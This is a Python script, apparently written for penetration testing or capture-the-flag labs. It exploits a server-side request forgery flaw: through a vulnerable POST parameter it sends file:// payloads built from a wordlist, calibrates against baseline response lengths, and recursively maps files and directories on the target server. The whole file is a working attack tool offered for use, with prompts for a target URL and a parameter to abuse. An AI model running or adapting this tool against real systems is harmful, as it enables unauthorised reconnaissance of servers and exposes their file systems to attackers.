#!/usr/bin/env python3
import requests
import os
import sys
import uuid
from datetime import datetime
from urllib.parse import quote

def print_banner():
    banner = """
        
    ███████╗███████╗██████╗ ███████╗    ███████╗███╗   ██╗██╗   ██╗███╗   ███╗
    ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔════╝████╗  ██║██║   ██║████╗ ████║
    ███████╗███████╗██████╔╝█████╗█████╗█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
    ╚════██║╚════██║██╔══██╗██╔══╝╚════╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
    ███████║███████║██║  ██║██║         ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
                                                                            
    Universal SSRF Local File & Directory Recursive Enumeration Tool
        Created by eMVee                                                       

    """
    print(banner)

# Isolated scanning function to allow recursive self-execution
def scan_directory(target_url, param_name, words, remote_dir, file_ext, error_status_code, baseline_html_len, found_files):
    print(f"[*] Scanning path: {remote_dir}")
    
    # Ensure the remote directory path always ends with a trailing slash
    if not remote_dir.endswith('/'):
        remote_dir += '/'

    discovered_in_this_dir = []

    for word in words:
        # Check if the word itself indicates a directory (ends with /)
        is_directory_word = word.endswith('/')
        clean_word = word.rstrip('/')

        # Determine the target filename based on object type
        if is_directory_word:
            filename = f"{clean_word}/"
        else:
            filename = f"{clean_word}{file_ext}"

        safe_filename = quote(filename)
        file_payload = f"file://{remote_dir}{safe_filename}"

        data = {
            param_name: file_payload
        }

        try:
            response = requests.post(target_url, data=data, timeout=5)
            
            # Mathematical evaluation based on precision length filtering
            current_html_len = len(response.text) - len(filename)
            
            # STricter Comparison:
            # An object is verified if status code changes OR naked length deviates from baseline error size
            if response.status_code != error_status_code or current_html_len != baseline_html_len:
                if "Telemetry failure" not in response.text and "URL rejected" not in response.text:
                    full_discovered_path = f"{remote_dir}{filename}"
                    print(f"[+] DISCOVERED: {full_discovered_path}")
                    
                    found_files.append(full_discovered_path)
                    discovered_in_this_dir.append(filename)
                
        except requests.exceptions.RequestException:
            continue

    # RECURSION LOGICA: If folders are discovered, recursively scan deeper into the branch
    for item in discovered_in_this_dir:
        # If the item ends with a slash, or if no extension is set (treating clean files as potential paths)
        if item.endswith('/') or file_ext == "":
            next_dir = f"{remote_dir}{item}"
            print(f"\n[➔] Diving deeper into discovered folder...")
            # Recursively trigger self-execution with the newly identified sub-path
            scan_directory(target_url, param_name, words, next_dir, file_ext, error_status_code, baseline_html_len, found_files)

def main():
    print_banner()

    # 1. Request dynamic user input parameters
    target_url = input("[*] Enter Vulnerable SSRF URL (e.g. http://10.0.2.21/sync.php): ").strip()
    param_name = input("[*] Enter Vulnerable POST Parameter (e.g. report_url): ").strip()
    wordlist_path = input("[*] Enter path to wordlist: (e.g. /usr/share/wordlists/dirb/common.txt)").strip()
    remote_dir = input("[*] Enter remote directory path (e.g. /var/www/html/): ").strip()
    file_ext = input("[*] Enter file extension to append (e.g. .php [or press Enter for none]): ").strip()
    project_name = input("[*] Enter project name for output file: ").strip()

    if not os.path.exists(wordlist_path):
        print(f"[E] Error: Wordlist file '{wordlist_path}' not found.")
        sys.exit(1)

    if not remote_dir.endswith('/'):
        remote_dir += '/'

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        words = [line.strip() for line in f if line.strip() and not line.startswith('#')]

    print(f"\n[*] Loaded {len(words)} words from dictionary.")
    
    # 2. MATHEMATICAL CALIBRATION
    print("[*] Calibrating server baseline math...")
    random_word = f"check-{uuid.uuid4()}"
    random_filename = f"{random_word}{file_ext}"
    calibration_payload = f"file://{remote_dir}{random_filename}"
    
    try:
        cal_response = requests.post(target_url, data={param_name: calibration_payload}, timeout=5)
        # Calculate naked HTML structure size excluding length of the unique test input
        baseline_html_len = len(cal_response.text) - len(random_word)
        error_status_code = cal_response.status_code
        print(f"[+] Calibration complete. Structural baseline length is {baseline_html_len} bytes.")
    except requests.exceptions.RequestException as e:
        print(f"[E] Calibration failed! Unable to connect to target URL: {e}")
        sys.exit(1)

    print("[*] Starting recursive enumeration scan...\n")

    found_files = []

    # Initialize the recursive scanning routine starting from the base path
    scan_directory(target_url, param_name, words, remote_dir, file_ext, error_status_code, baseline_html_len, found_files)

    # 4. Export consolidated discovery logs
    timestamp = datetime.now().strftime("%Y%m%d%H%M")
    output_filename = f"{timestamp}-Output-{project_name}.txt"

    print("\n" + "=" * 65)
    print(f"[*] Scan completed. Found {len(found_files)} total items across all directories.")
    
    with open(output_filename, 'w', encoding='utf-8') as out_file:
        out_file.write(f"Universal SSRF Recursive Enumeration Report\n")
        out_file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        out_file.write(f"Vulnerable Target: {target_url} ({param_name})\n")
        out_file.write(f"Starting Directory: {remote_dir}\n")
        out_file.write("=" * 50 + "\n\n")
        
        if found_files:
            for discovered in found_files:
                out_file.write(f"{discovered}\n")
            print(f"[v] Discovered files successfully saved to: {output_filename}")
        else:
            out_file.write("No files discovered during this recursive enumeration sequence.\n")
            print(f"[*] Report saved to {output_filename} (No files discovered).")
    print("=" * 65)

if __name__ == "__main__":
    main()
